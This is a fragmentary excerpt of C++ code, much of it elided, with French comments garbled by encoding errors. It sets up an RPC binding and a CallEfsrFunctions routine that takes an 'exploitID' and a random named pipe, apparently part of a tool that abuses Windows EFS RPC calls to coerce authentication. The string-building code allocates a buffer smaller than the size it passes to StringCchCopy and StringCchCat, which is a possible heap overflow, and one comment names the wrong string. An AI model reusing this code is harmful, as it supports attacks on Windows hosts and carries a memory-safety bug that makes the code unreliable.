...
BOOL createRPCbind(RPC_BINDING_HANDLE& binding_h)
{
    ...
    status = RpcStringBindingCompose(
        ...
        nullptr,              // Options (utilisez nullptr pour les options par dйfaut)
        &bindingString
    );
...
long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, std::wstring randomNamedpipe)
{
    ...
    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, (chaine1.length() + randomNamedpipe.length() + 1) * sizeof(wchar_t)); // Allouez la mйmoire

    if (targetedPipeName) {
        StringCchCopy(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, chaine1.c_str()); // Copiez la chaоne chaine1
        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, randomNamedpipe.c_str()); // Concatйnez la chaоne randomNamedpipe
        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, filename.c_str()); // Concatйnez la chaоne randomNamedpipe
